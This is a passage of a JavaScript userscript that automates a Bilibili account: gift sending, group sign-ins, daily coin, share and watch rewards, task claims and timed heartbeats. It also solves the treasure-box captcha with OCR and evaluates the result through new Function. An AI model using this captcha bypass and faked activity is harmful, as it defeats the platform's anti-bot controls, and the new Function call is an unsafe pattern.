                        if (CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID
                            .length > 0) {
                            medal_list = medal_list.filter(r => CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(
                                exp => exp == r.roomid) == -1);
                        }
                        let bag_list = await Gift.getBagList();
                        for (let v of medal_list) {
                            if (Gift.over) break;
                            let remain_feed = v.day_limit - v.today_feed;
                            if (remain_feed > 0) {
                                let now = ts_s();
                                if (!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL) {
                                    //送之前查一次有没有可送的
                                    let pass = bag_list.filter(r => ![4, 3, 9, 10].includes(r.gift_id) && r
                                                               .gift_num > 0 && r.expire_at > now && (r.expire_at - now <
                                                                                                      CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
                                    if (pass.length == 0) {
                                        break;
                                    } else {
                                        bag_list = pass;
                                    }
                                }
                                window.toast(
                                    `[自动送礼]勋章[${v.medalName}] 今日亲密度未满[${v.today_feed}/${v.day_limit}]，预计需要[${remain_feed}]送礼开始`,
                                    'info');
                                await Gift.sendGift(v, bag_list);
                            } else {
                                window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度已满`, 'info');
                            }
                        }
                        CACHE.gift_ts = ts_ms();
                        Essential.Cache.save();
                    }
                    await delayCall(() => Gift.run(), Gift.interval);
                } catch (err) {
                    func();
                    window.toast('[自动送礼]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            },
            sendGift: async (medal, bag_list = []) => {
                if (Gift.time <= 0) Gift.time = ts_s();
                let ruid = medal.target_id;
                let remain_feed = medal.day_limit - medal.today_feed;
                if (remain_feed <= 0) {
                    window.toast(`[自动送礼]勋章[${medal.medalName}] 今日亲密度已满`, 'info');
                    return;
                }
                let response = await API.room.room_init(parseInt(medal.roomid, 10));
                let room_id = parseInt(response.data.room_id, 10);
                if (bag_list.length == 0) {
                    bag_list = await Gift.getBagList();
                }
                let now = ts_s();
                if (!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL) {
                    //送之前查一次有没有可送的
                    let pass = bag_list.filter(r => ![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 &&
                                               r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
                    if (pass.length == 0) {
                        Gift.over = true;
                        return;
                    } else {
                        bag_list = pass;
                    }
                }
                for (const v of bag_list) {
                    if (remain_feed <= 0) {
                        window.toast(
                            `[自动送礼]勋章[${medal.medalName}] 送礼结束，今日亲密度已满[${medal.today_feed}/${medal.day_limit}]`,
                            'info');
                        return;
                    }
                    if ((
                        //特殊礼物排除
                        (![4, 3, 9, 10].includes(v.gift_id)
                         //满足到期时间
                         &&
                         v.expire_at > Gift.time && (v.expire_at - Gift.time < CONFIG.AUTO_GIFT_CONFIG
                                                     .GIFT_LIMIT)
                        )
                        //或者全部送满
                        ||
                        CONFIG.AUTO_GIFT_CONFIG.SEND_ALL)
                        //永久礼物不自动送
                        &&
                        v.expire_at > Gift.time) {
                        // 检查SEND_ALL和礼物到期时间 送当天到期的
                        const feed = Gift.getFeedByGiftID(v.gift_id);
                        if (feed > 0) {
                            let feed_num = Math.floor(remain_feed / feed);
                            if (feed_num > v.gift_num) feed_num = v.gift_num;
                            if (feed_num > 0) {
                                try {
                                    let response = await API.gift.bag_send(Info.uid, v.gift_id, ruid,
                                                                           feed_num, v.bag_id, room_id, Info.rnd);
                                    DEBUG('Gift.sendGift: API.gift.bag_send', response);
                                    if (response.code === 0) {
                                        v.gift_num -= feed_num;
                                        medal.today_feed += feed_num * feed;
                                        remain_feed -= feed_num * feed;
                                        window.toast(
                                            `[自动送礼]勋章[${medal.medalName}] 送礼成功，送出${feed_num}个${v.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`,
                                            'success');
                                    } else {
                                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼异常:${response.msg}`,
                                                     'caution');
                                    }
                                } catch (e) {
                                    window.toast('[自动送礼]包裹送礼失败，请检查网络', 'error');
                                    return await delayCall(() => Gift.sendGift(medal));
                                }
                            }
                        }
                    }
                }
            }
        }; // Once Run every 10 minutes

        const GroupSign = {
            runHour:9,
            getGroups: () => {
                return API.Group.my_groups().then((response) => {
                    DEBUG('GroupSign.getGroups: API.Group.my_groups', response);
                    if (response.code === 0) return $.Deferred().resolve(response.data.list);
                    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                    return $.Deferred().reject();
                }, () => {
                    window.toast('[自动应援团签到]获取应援团列表失败，请检查网络', 'error');
                    return delayCall(() => GroupSign.getGroups());
                });
            },
            signInList:async(list) => {
                //if (i >= list.length) return $.Deferred().resolve();
                try{
                    for(let obj of list){
                        let errorCount = 0;
                        //自己不能给自己的应援团应援
                        if (obj.owner_uid == Info.uid) continue;
                        do{
                            try{
                                let response = await API.Group.sign_in(obj.group_id, obj.owner_uid);
                                DEBUG('GroupSign.signInList: API.Group.sign_in', response);
                                if (response.code === 0) {
                                    if (response.data.add_num > 0) {
                                        window.toast(
                                            `[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到成功，当前勋章亲密度+${response.data.add_num}`,
                                            'success');
                                        break;
                                    } else if (response.data.status === 1) {
                                        break;
                                    }
                                    errorCount++;
                                } else {
                                    errorCount++;
                                    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                                }
                            }catch(e){
                                errorCount++;
                            }
                        }while(errorCount<3);
                    }
                }
                catch(e){
                    return delayCall(() => GroupSign.signInList(list));
                }
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_GROUP_SIGN) return $.Deferred().resolve();
                    if (CACHE.group_sign_ts && !checkNewDay(CACHE.group_sign_ts)) {
                        // 同一天，不再检查应援团签到
                        runTomorrow(GroupSign.run,GroupSign.runHour);
                        return $.Deferred().resolve();
                    }
                    let now = new Date();
                    let limit = new Date().setHours(GroupSign.runHour,0,0,0) - now;
                    if(limit>0){
                        setTimeout(GroupSign.run,limit);
                        return $.Deferred().resolve();
                    }
                    return GroupSign.getGroups().then((list) => {
                        return GroupSign.signInList(list).then(() => {
                            CACHE.group_sign_ts = ts_ms();
                            runTomorrow(GroupSign.run,GroupSign.runHour);
                        }, () => delayCall(() => GroupSign.run()));
                    }, () => delayCall(() => GroupSign.run()));
                } catch (err) {
                    window.toast('[自动应援团签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day 9 hours "api.live.bilibili.com"
        const DailyReward = {
            coin_exp: 0,
            login: () => {
                return API.DailyReward.login().then(() => {
                    DEBUG('DailyReward.login: API.DailyReward.login');
                    window.toast('[自动每日奖励][每日登录]完成', 'success');
                }, () => {
                    window.toast('[自动每日奖励][每日登录]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.login());
                });
            },
            watch: (aid, cid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.WATCH) return $.Deferred().resolve();
                return API.DailyReward.watch(aid, cid, Info.uid, ts_s()).then((response) => {
                    DEBUG('DailyReward.watch: API.DailyReward.watch', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日观看]完成(av=${aid})`, 'success');
                    } else {
                        window.toast(`[自动每日奖励][每日观看]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日观看]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.watch(aid, cid));
                });
            },
            coin: (cards, n, i = 0, one = false) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.COIN) return $.Deferred().resolve();
                if (DailyReward.coin_exp >= CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER * 10) {
                    window.toast('[自动每日奖励][每日投币]今日投币已完成', 'info');
                    return $.Deferred().resolve();
                }
                if (i >= cards.length) {
                    window.toast('[自动每日奖励][每日投币]动态里可投币的视频不足', 'caution');
                    return $.Deferred().resolve();
                }
                const obj = JSON.parse(cards[i].card);
                let num = Math.min(2, n);
                if (one) num = 1;
                return API.DailyReward.coin(obj.aid, num).then((response) => {
                    DEBUG('DailyReward.coin: API.DailyReward.coin', response);
                    if (response.code === 0) {
                        DailyReward.coin_exp += num * 10;
                        window.toast(`[自动每日奖励][每日投币]投币成功(av=${obj.aid},num=${num})`, 'success');
                        return DailyReward.coin(cards, n - num, i + 1);
                    } else if (response.code === -110) {
                        window.toast('[自动每日奖励][每日投币]未绑定手机，已停止', 'error');
                        return $.Deferred().reject();
                    } else if (response.code === 34003) {
                        // 非法的投币数量
                        if (one) return DailyReward.coin(cards, n, i + 1);
                        return DailyReward.coin(cards, n, i, true);
                    } else if (response.code === 34005) {
                        // 塞满啦！先看看库存吧~
                        return DailyReward.coin(cards, n, i + 1);
                    }
                    window.toast(`[自动每日奖励][每日投币]'${response.msg}`, 'caution');
                    return DailyReward.coin(cards, n, i + 1);
                }, () => delayCall(() => DailyReward.coin(cards, n, i)));
            },
            share: (aid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.SHARE) return $.Deferred().resolve();
                return API.DailyReward.share(aid).then((response) => {
                    DEBUG('DailyReward.share: API.DailyReward.share', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日分享]分享成功(av=${aid})`, 'success');
                    } else if (response.code === 71000) {
                        // 重复分享
                        window.toast('[自动每日奖励][每日分享]今日分享已完成', 'info');
                    } else {
                        window.toast(`[自动每日奖励][每日分享]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日分享]分享失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.share(aid));
                });
            },
            dynamic: () => {
                return API.dynamic_svr.dynamic_new(Info.uid, 8).then((response) => {
                    DEBUG('DailyReward.dynamic: API.dynamic_svr.dynamic_new', response);
                    if (response.code === 0) {
                        if (response.data.cards[0]) {
                            const obj = JSON.parse(response.data.cards[0].card);
                            const p1 = DailyReward.watch(obj.aid, obj.cid);
                            const p2 = DailyReward.coin(response.data.cards, Math.max(CONFIG.AUTO_DAILYREWARD_CONFIG
                                                                                      .COIN_CONFIG.NUMBER - DailyReward.coin_exp / 10, 0));
                            const p3 = DailyReward.share(obj.aid);
                            return $.when(p1, p2, p3);
                        } else {
                            window.toast('[自动每日奖励]"动态-投稿视频"中暂无动态', 'info');
                        }
                    } else {
                        window.toast(`[自动每日奖励]获取"动态-投稿视频"'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励]获取"动态-投稿视频"失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.dynamic());
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_DAILYREWARD) return $.Deferred().resolve();
                    if (CACHE.dailyreward_ts && !checkNewDay(CACHE.dailyreward_ts)) {
                        // 同一天，不执行每日任务
                        runTomorrow(DailyReward.run);
                        return $.Deferred().resolve();
                    }
                    return API.DailyReward.exp().then((response) => {
                        DEBUG('DailyReward.run: API.DailyReward.exp', response);
                        if (response.code === 0) {
                            DailyReward.coin_exp = response.number;
                            DailyReward.login();
                            return DailyReward.dynamic().then(() => {
                                CACHE.dailyreward_ts = ts_ms();
                                runTomorrow(DailyReward.run);
                            });
                        } else {
                            window.toast(`[自动每日奖励]${response.message}`, 'caution');
                        }
                    }, () => {
                        window.toast('[自动每日奖励]获取每日奖励信息失败，请检查网络', 'error');
                        return delayCall(() => DailyReward.run());
                    });
                } catch (err) {
                    window.toast('[自动每日奖励]运行时出现异常', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const Task = {
            interval: 600e3,
            double_watch_task: false,
            run_timer: undefined,
            MobileHeartbeat: false,
            PCHeartbeat: false,
            run: async () => {
                try {
                    if (!CONFIG.AUTO_TASK) return $.Deferred().resolve();
                    if (!Info.mobile_verify) {
                        window.toast('[自动完成任务]未绑定手机，已停止', 'caution');
                        return $.Deferred().resolve();
                    }
                    if (Task.run_timer) clearTimeout(Task.run_timer);
                    if (CACHE.task_ts && !Task.MobileHeartbeat && !Task.PCHeartbeat) {
                        const diff = ts_ms() - CACHE.task_ts;
                        if (diff < Task.interval) {
                            Task.run_timer = setTimeout(Task.run, Task.interval - diff);
                            return $.Deferred().resolve();
                        }
                    }
                    if (Task.MobileHeartbeat) Task.MobileHeartbeat = false;
                    if (Task.PCHeartbeat) Task.PCHeartbeat = false;
                    return API.i.taskInfo().then(async (response) => {
                        DEBUG('Task.run: API.i.taskInfo', response);
                        for (const key in response.data) {
                            if (typeof response.data[key] === 'object') {
                                if (response.data[key].task_id && response.data[key].status ===
                                    1) {
                                    await Task.receiveAward(response.data[key].task_id);
                                } else if (response.data[key].task_id === 'double_watch_task') {
                                    if (response.data[key].status === 0) {
                                        Task.double_watch_task = false;
                                        if (Token && TokenUtil && Info.appToken && !Task.double_watch_task) {
                                            await BiliPushUtils.API.Heart.mobile_info();
                                        }
                                    } else if (response.data[key].status === 2) {
                                        Task.double_watch_task = true;
                                    } else {
                                        Task.double_watch_task = false;
                                    }
                                }
                            }
                        }
                    }).always(() => {
                        CACHE.task_ts = ts_ms();
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                        Task.run_timer = setTimeout(Task.run, Task.interval);
                    }, () => delayCall(() => Task.run()));
                } catch (err) {
                    window.toast('[自动完成任务]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            receiveAward: async (task_id) => {
                return API.activity.receive_award(task_id).then((response) => {
                    DEBUG('Task.receiveAward: API.activity.receive_award', response);
                    if (response.code === 0) {
                        // 完成任务
                        window.toast(`[自动完成任务]完成任务：${task_id}`, 'success');
                        if (task_id === 'double_watch_task') Task.double_watch_task = true;
                    } else if (response.code === -400) {
                        // 奖励已领取
                        // window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'info');
                    } else {
                        window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动完成任务]完成任务失败，请检查网络', 'error');
                    return delayCall(() => Task.receiveAward(task_id));
                });
            }
        }; // Once Run every 10 minutes
        const MobileHeartbeat = {
            run_timer: undefined,
            run: async () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if (Task.double_watch_task) return $.Deferred().resolve();
                    if (MobileHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.MobileHeartbeat = true;
                        Task.run();
                    }
                    if (MobileHeartbeat.run_timer) clearTimeout(MobileHeartbeat.run_timer);
                    //API.HeartBeat.mobile
                    BiliPushUtils.API.Heart.mobile().then((rsp) => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.mobile');
                        MobileHeartbeat.run_timer = setTimeout(MobileHeartbeat.run, 300e3);
                    }, () => delayCall(() => MobileHeartbeat.run()));
                } catch (err) {
                    window.toast('[移动端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins
        const WebHeartbeat = {
            run_timer: undefined,
            run: () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if (WebHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.WebHeartbeat = true;
                        Task.run();
                    }
                    if (WebHeartbeat.run_timer) clearTimeout(WebHeartbeat.run_timer);
                    API.HeartBeat.web().then(() => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.web');
                        WebHeartbeat.run_timer = setTimeout(WebHeartbeat.run, 300e3);
                    }, () => delayCall(() => WebHeartbeat.run()));
                } catch (err) {
                    window.toast('[WEB端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins

        const TreasureBox = {
            timer: undefined,
            time_end: undefined,
            time_start: undefined,
            promise: {
                calc: undefined,
                timer: undefined
            },
            DOM: {
                image: undefined,
                canvas: undefined,
                div_tip: undefined,
                div_timer: undefined
            },
            init: () => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().resolve();
                const p = $.Deferred();
                runUntilSucceed(() => {
                    try {
                        if ($('.draw-box.gift-left-part').length) {
                            window.toast('[自动领取瓜子]当前直播间有实物抽奖，暂停领瓜子功能', 'caution');
                            p.resolve();
                            return true;
                        }
                        let treasure_box = $('#gift-control-vm div.treasure-box.p-relative');
                        if (!treasure_box.length) return false;
                        treasure_box = treasure_box.first();
                        treasure_box.attr('id', 'old_treasure_box');
                        treasure_box.hide();
                        const div = $(
                            `<div id="${NAME}_treasure_div" class="treasure-box p-relative" style="min-width: 46px;display: inline-block;float: left;padding: 22px 0 0 15px;"></div>`
			);
                        TreasureBox.DOM.div_tip = $(
                            `<div id="${NAME}_treasure_div_tip" class="t-center b-box none-select">自动<br>领取中</div>`
			);
                        TreasureBox.DOM.div_timer = $(
                            `<div id="${NAME}_treasure_div_timer" class="t-center b-box none-select">0</div>`
			);
                        TreasureBox.DOM.image = $(
                            `<img id="${NAME}_treasure_image" style="display:none">`);
                        TreasureBox.DOM.canvas = $(
                            `<canvas id="${NAME}_treasure_canvas" style="display:none" height="40" width="120"></canvas>`
			);
                        const css_text =
                              'min-width: 40px;padding: 2px 3px;margin-top: 3px;font-size: 12px;color: #fff;background-color: rgba(0,0,0,.5);border-radius: 10px;';
                        TreasureBox.DOM.div_tip[0].style = css_text;
                        TreasureBox.DOM.div_timer[0].style = css_text;
                        div.append(TreasureBox.DOM.div_tip);
                        div.append(TreasureBox.DOM.image);
                        div.append(TreasureBox.DOM.canvas);
                        TreasureBox.DOM.div_tip.after(TreasureBox.DOM.div_timer);
                        treasure_box.after(div);
                        if (!Info.mobile_verify) {
                            TreasureBox.setMsg('未绑定<br>手机');
                            window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
                            p.resolve();
                            return true;
                        }
                        try {
                            if (OCRAD);
                        } catch (err) {
                            TreasureBox.setMsg('初始化<br>失败');
                            window.toast('[自动领取瓜子]OCRAD初始化失败，请检查网络', 'error');
                            console.error(`[${NAME}]`, err);
                            p.resolve();
                            return true;
                        }
                        TreasureBox.timer = setInterval(() => {
                            let t = parseInt(TreasureBox.DOM.div_timer.text(), 10);
                            if (isNaN(t)) t = 0;
                            if (t > 0) TreasureBox.DOM.div_timer.text(`${t - 1}s`);
                            else TreasureBox.DOM.div_timer.hide();
                        }, 1e3);
                        TreasureBox.DOM.image[0].onload = () => {
                            // 实现功能类似 https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js 中Live.treasure.init()的验证码处理部分
                            const ctx = TreasureBox.DOM.canvas[0].getContext('2d');
                            ctx.font = '40px agencyfbbold';
                            ctx.textBaseline = 'top';
                            ctx.clearRect(0, 0, TreasureBox.DOM.canvas[0].width, TreasureBox.DOM
                                          .canvas[0].height);
                            ctx.drawImage(TreasureBox.DOM.image[0], 0, 0);
                            const grayscaleMap = TreasureBox.captcha.OCR.getGrayscaleMap(ctx);
                            const filterMap = TreasureBox.captcha.OCR.orderFilter2In3x3(
                                grayscaleMap);
                            ctx.clearRect(0, 0, 120, 40);
                            for (let i = 0; i < filterMap.length; ++i) {
                                const gray = filterMap[i];
                                ctx.fillStyle = `rgb(${gray}, ${gray}, ${gray})`;
                                ctx.fillRect(i % 120, Math.round(i / 120), 1, 1);
                            }
                            try {
                                const question = TreasureBox.captcha.correctQuestion(OCRAD(ctx.getImageData(
                                    0, 0, 120, 40)));
                                DEBUG('TreasureBox.DOM.image.load', 'question =', question);
                                const answer = TreasureBox.captcha.eval(question);
                                DEBUG('TreasureBox.DOM.image.load', 'answer =', answer);
                                if (answer !== undefined) {
                                    // window.toast(`[自动领取瓜子]验证码识别结果: ${question} = ${answer}`, 'info');
                                    console.info(
                                        `[${NAME}][自动领取瓜子]验证码识别结果: ${question} = ${answer}`
				    );
                                    TreasureBox.promise.calc.resolve(answer);
                                }
                            } catch (err) {
                                TreasureBox.promise.calc.reject();
                            }
                        };
                        p.resolve();
                        return true;
                    } catch (err) {
                        window.toast('[自动领取瓜子]初始化时出现异常，已停止', 'error');
                        console.error(`[${NAME}]`, err);
                        p.reject();
                        return true;
                    }
                });
                return p;
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_TREASUREBOX || !TreasureBox.timer) return;
                    if (Info.awardBlocked) {
                        TreasureBox.setMsg('瓜子小黑屋');
                        window.toast('[自动领取瓜子]帐号被关小黑屋，停止领取瓜子', 'caution');
                        return;
                    }
                    if (CACHE.treasure_box_ts && !checkNewDay(CACHE.treasure_box_ts)) {
                        TreasureBox.setMsg('今日<br>已领完');
                        runTomorrow(TreasureBox.run);
                        return;
                    }
                    TreasureBox.getCurrentTask().then((response) => {
                        DEBUG('TreasureBox.run: TreasureBox.getCurrentTask().then', response);
                        if (response.code === 0) {
                            // 获取任务成功
                            TreasureBox.promise.timer = $.Deferred();
                            TreasureBox.promise.timer.then(() => {
                                TreasureBox.captcha.calc().then((captcha) => {
                                    // 验证码识别完成
                                    TreasureBox.getAward(captcha).then(() =>
                                                                       TreasureBox.run(), () => TreasureBox.run()
                                                                      );
                                }, () => TreasureBox.run());
                            });
                            TreasureBox.time_end = response.data.time_end;
                            TreasureBox.time_start = response.data.time_start;
                            let t = TreasureBox.time_end - ts_s() + 1;
                            if (t < 0) t = 0;
                            setTimeout(() => {
                                if (TreasureBox.promise.timer) TreasureBox.promise.timer.resolve();
                            }, t * 1e3);
                            TreasureBox.DOM.div_timer.text(`${t}s`);
                            TreasureBox.DOM.div_timer.show();
                            TreasureBox.DOM.div_tip.html(
                                `次数<br>${response.data.times}/${response.data.max_times}<br>银瓜子<br>${response.data.silver}`
			    );
                        } else if (response.code === -10017) {
                            // 今天所有的宝箱已经领完!
                            TreasureBox.setMsg('今日<br>已领完');
                            // window.toast(`[自动领取瓜子]${response.msg}`, 'info');
                            CACHE.treasure_box_ts = ts_ms();
                            Essential.Cache.save();
                            runTomorrow(TreasureBox.run);
                        } else if (response.code === -500) {
                            // 请先登录!
                            location.reload();
                        } else {
                            window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                            return TreasureBox.run();
                        }
                    });
                } catch (err) {
                    TreasureBox.setMsg('运行<br>异常');
                    window.toast('[自动领取瓜子]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            },
            setMsg: (htmltext) => {
                if (!CONFIG.AUTO_TREASUREBOX) return;
                if (TreasureBox.promise.timer) {
                    TreasureBox.promise.timer.reject();
                    TreasureBox.promise.timer = undefined;
                }
                if (TreasureBox.DOM.div_timer) TreasureBox.DOM.div_timer.hide();
                if (TreasureBox.DOM.div_tip) TreasureBox.DOM.div_tip.html(htmltext);
            },
            getAward: (captcha, cnt = 0) => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
                if (cnt > 3) return $.Deferred().resolve(); // 3次时间未到，重新运行任务
                return API.TreasureBox.getAward(TreasureBox.time_start, TreasureBox.time_end, captcha).then(
                    (response) => {
                        DEBUG('TreasureBox.getAward: getAward', response);
                        switch (response.code) {
                            case 0:
                                window.toast(`[自动领取瓜子]领取了 ${response.data.awardSilver} 银瓜子`, 'success');
                            case -903: // -903: 已经领取过这个宝箱
                                // window.toast('[自动领取瓜子]已经领取过这个宝箱', 'caution');
                                return $.Deferred().resolve();
                            case -902: // -902: 验证码错误
                            case -901: // -901: 验证码过期
                                return TreasureBox.captcha.calc().then((captcha) => {
                                    return TreasureBox.getAward(captcha, cnt);
                                });
                            case -800: // -800：未绑定手机
                                TreasureBox.setMsg('未绑定<br>手机');
                                window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
                                return $.Deferred().reject();
                            case -500: // -500：领取时间未到, 请稍后再试
                                {
                                    const p = $.Deferred();
                                    setTimeout(() => {
                                        TreasureBox.captcha.calc().then((captcha) => {
                                            TreasureBox.getAward(captcha, cnt + 1).then(() =>
                                                                                        p.resolve(), () => p.reject());
                                        }, () => p.reject());
                                    }, 3e3);
                                    return p;
                                }
                            case 400: // 400: 访问被拒绝
                                if (response.msg.indexOf('拒绝') > -1) {
                                    Info.awardBlocked = true;
                                    Essential.DataSync.down();
                                    TreasureBox.setMsg('拒绝<br>访问');
                                    window.toast('[自动领取瓜子]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                    return $.Deferred().reject();
                                }
                                window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                                return $.Deferred().resolve();
                            default: // 其他错误
                                window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                        }
                    }, () => {
                        window.toast('[自动领取瓜子]获取任务失败，请检查网络', 'error');
                        return delayCall(() => TreasureBox.getAward(captcha, cnt));
                    });
            },
            getCurrentTask: () => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
                return API.TreasureBox.getCurrentTask().then((response) => {
                    DEBUG('TreasureBox.getCurrentTask: API.TreasureBox.getCurrentTask', response);
                    return $.Deferred().resolve(response);
                }, () => {
                    window.toast('[自动领取瓜子]获取当前任务失败，请检查网络', 'error');
                    return delayCall(() => TreasureBox.getCurrentTask());
                });
            },
            captcha: {
                cnt: 0,
                calc: () => {
                    if (!CONFIG.AUTO_TREASUREBOX) {
                        TreasureBox.captcha.cnt = 0;
                        return $.Deferred().reject();
                    }
                    if (TreasureBox.captcha.cnt > 100) { // 允许验证码无法识别的次数
                        // 验证码识别失败
                        TreasureBox.setMsg('验证码<br>识别<br>失败');
                        window.toast('[自动领取瓜子]验证码识别失败，已停止', 'error');
                        return $.Deferred().reject();
                    }
                    return API.TreasureBox.getCaptcha(ts_ms()).then((response) => {
                        DEBUG('TreasureBox.captcha.calc: getCaptcha', response);
                        if (response.code === 0) {
                            TreasureBox.captcha.cnt++;
                            const p = $.Deferred();
                            TreasureBox.promise.calc = $.Deferred();
                            TreasureBox.promise.calc.then((captcha) => {
                                TreasureBox.captcha.cnt = 0;
                                p.resolve(captcha);
                            }, () => {
                                TreasureBox.captcha.calc().then((captcha) => {
                                    p.resolve(captcha);
                                }, () => {
                                    p.reject();
                                });
                            });
                            TreasureBox.DOM.image.attr('src', response.data.img);
                            return p;
                        } else {
                            window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                            return delayCall(() => TreasureBox.captcha.calc());
                        }
                    }, () => {
                        window.toast('[自动领取瓜子]加载验证码失败，请检查网络', 'error');
                        return delayCall(() => TreasureBox.captcha.calc());
                    });
                },
                // 对B站验证码进行处理
                // 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
                // 删除了未使用的变量
                OCR: {
                    getGrayscaleMap: (context, rate = 235, width = 120, height = 40) => {
                        function getGrayscale(x, y) {
                            const pixel = context.getImageData(x, y, 1, 1).data;
                            return pixel ? (77 * pixel[0] + 150 * pixel[1] + 29 * pixel[2] + 128) >> 8 : 0;
                        }
                        const map = [];
                        for (let y = 0; y < height; y++) { // line y
                            for (let x = 0; x < width; x++) { // column x
                                const gray = getGrayscale(x, y);
                                map.push(gray > rate ? gray : 0);
                            }
                        }
                        return map;
                    },
                    orderFilter2In3x3: (grayscaleMap, n = 9, width = 120) => {
                        const gray = (x, y) => (x + y * width >= 0) ? grayscaleMap[x + y * width] : 255;
                        const map = [];
                        const length = grayscaleMap.length;
                        const catchNumber = n - 1;
                        for (let i = 0; i < length; ++i) {
                            const [x, y] = [i % width, Math.floor(i / width)];
                            const matrix = new Array(9);
                            matrix[0] = gray(x - 1, y - 1);
                            matrix[1] = gray(x + 0, y - 1);
                            matrix[2] = gray(x + 1, y - 1);
                            matrix[3] = gray(x - 1, y + 0);
                            matrix[4] = gray(x + 0, y + 0);
                            matrix[5] = gray(x + 1, y + 0);
                            matrix[6] = gray(x - 1, y + 1);
                            matrix[7] = gray(x + 0, y + 1);
                            matrix[8] = gray(x + 1, y + 1);
                            matrix.sort((a, b) => a - b);
                            map.push(matrix[catchNumber]);
                        }
                        return map;
                    },
                    execMap: (connectMap, rate = 4) => {
                        const map = [];
                        const connectMapLength = connectMap.length;
                        for (let i = 0; i < connectMapLength; ++i) {
                            let blackPoint = 0;
                            // const [x, y] = [i % 120, Math.round(i / 120)];
                            const top = connectMap[i - 120];
                            const topLeft = connectMap[i - 120 - 1];
                            const topRight = connectMap[i - 120 + 1];
                            const left = connectMap[i - 1];
                            const right = connectMap[i + 1];
                            const bottom = connectMap[i + 120];
                            const bottomLeft = connectMap[i + 120 - 1];
                            const bottomRight = connectMap[i + 120 + 1];
                            if (top) blackPoint += 1;
                            if (topLeft) blackPoint += 1;
                            if (topRight) blackPoint += 1;
                            if (left) blackPoint += 1;
                            if (right) blackPoint += 1;
                            if (bottom) blackPoint += 1;
                            if (bottomLeft) blackPoint += 1;
                            if (bottomRight) blackPoint += 1;
                            if (blackPoint > rate) map.push(1);
                            else map.push(0);
                        }
                        return map;
                    }
                },
                eval: (fn) => {
                    let Fn = Function;
                    return new Fn(`return ${fn}`)();
                },
                // 修正OCRAD识别结果
                // 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
                // 修改部分：
                // 1.将correctStr声明在correctQuestion函数内部，并修改相关引用
                // 2.在correctStr中增加'>': 3
                correctStr: {
                    'g': 9,
                    'z': 2,
                    'Z': 2,
                    'o': 0,
                    'l': 1,
                    'B': 8,
                    'O': 0,
                    'S': 6,
                    's': 6,
                    'i': 1,
                    'I': 1,
                    '.': '-',
                    '_': 4,
                    'b': 6,
                    'R': 8,
                    '|': 1,
                    'D': 0,
                    '>': 3
                },
